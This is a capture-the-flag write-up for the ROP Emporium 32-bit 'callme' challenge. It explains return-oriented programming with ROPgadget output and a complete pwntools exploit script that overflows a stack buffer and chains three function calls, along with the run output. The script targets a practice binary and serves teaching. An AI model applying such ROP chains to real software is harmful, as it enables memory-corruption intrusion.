## Callme
### Challenge Description :  Chain calls to multiple imported methods with specific arguments and see how the differences between 64 & 32 bit calling conventions affect your ROP chain.

---
### HINT : To dispose of the need for any RE we'll tell you the following:
You must call callme_one(), callme_two() and callme_three() in that order, each with the arguments 1,2,3 e.g. callme_one(1,2,3) to print the flag. The solution here is simple enough, use your knowledge about what resides in the PLT to call the callme_ functions in the above order and with the correct arguments. Don't get distracted by the incorrect calls to these functions made in the binary, they're there to ensure these functions get linked. You can also ignore the .dat files and the encrypted flag in this challenge, they're there to ensure the functions must be called in the correct order.

---
So, building up on the previous challenge, now, we have to call three functions in order to get the flag. 

---
Few definitions : 

RET : Transfers program control to a return address located on the top of the stack

Call : call causes the procedure named in the operand to be executed

---

Like previous challenges, to call a specific function, we need to overwrite the %old ebp in the stack for the first function call. After the function is done executing, we need the address of a *cleanup* function/code. This should be followed by the 3 parameters, 1,2 & 3. 

*cleanup* : This code should remove the three parameters from the stack, so that when the function returns, it calls the next function. Since, `NX Enabled`, we can't inject a shell code do the same for us. So, we use `ROP`. We try to find something in the assembly itself, so that we can execute the above logic. 

So, to do the same, we use `ROPgadget` which searches the assembly for `gadgets` which is basically just a fance term for code snippets which end in a return and can be used for ROP purposes. 

We need gadgets that contain mov or pop, so that stack can be emptied.

```
ROPgadget --binary callme32 --only "mov|pop|ret"

Gadgets information
========================================================
====
0x08048707 : mov al, byte ptr [0xc9010804] ; ret
0x08048670 : mov ebx, dword ptr [esp] ; ret
0x080488ab : pop ebp ; ret
0x080488a8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x08048579 : pop ebx ; ret
0x080488aa : pop edi ; pop ebp ; ret
0x080488a9 : pop esi ; pop edi ; pop ebp ; ret
0x08048562 : ret
0x080486be : ret 0xeac1

Unique gadgets found: 9
```

The `gadget` at `0x080488a9` looks good as it empties three values from the stack. 

So, for the exploit.

`exploit.py`

```
from pwn import *


def add_rop(payload):
    payload+=p32(0x080488a9)
    payload+=p32(1)
    payload+=p32(2)
    payload+=p32(3)
    return payload

elf = context.binary = ELF('callme32')

info('callme_one : %#x',elf.symbols.callme_one)
info('callme_two : %#x',elf.symbols.callme_two)
info('callme_three : %#x',elf.symbols.callme_three)

offset=44
one = p32(elf.symbols.callme_one)
two = p32(elf.symbols.callme_two)
three = p32(elf.symbols.callme_three)

payload='A'*44
payload+=one
payload=add_rop(payload)
payload+=two
payload=add_rop(payload)
payload+=three
payload=add_rop(payload)

io = process(elf.path)

io.recv()
io.sendline(payload)

flag = io.recvall()
success("Flag : %s",flag)

```
`output`

```
 python2 exploit.py 
[*] '/ropemporium/callme/callme32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
    RPATH:    './'
[*] callme_one : 0x80485c0
[*] callme_two : 0x8048620
[*] callme_three : 0x80485b0
[+] Starting local process '/home/vipul/Desktop/ropempor
ium/callme/callme32': pid 16024
[+] Receiving all data: Done (32B)
[*] Process '/ropemporium/callme/callme32' stopped with exit code 0 (pid 16024)
[+] Flag : ROPE{a_placeholder_32byte_flag!}
```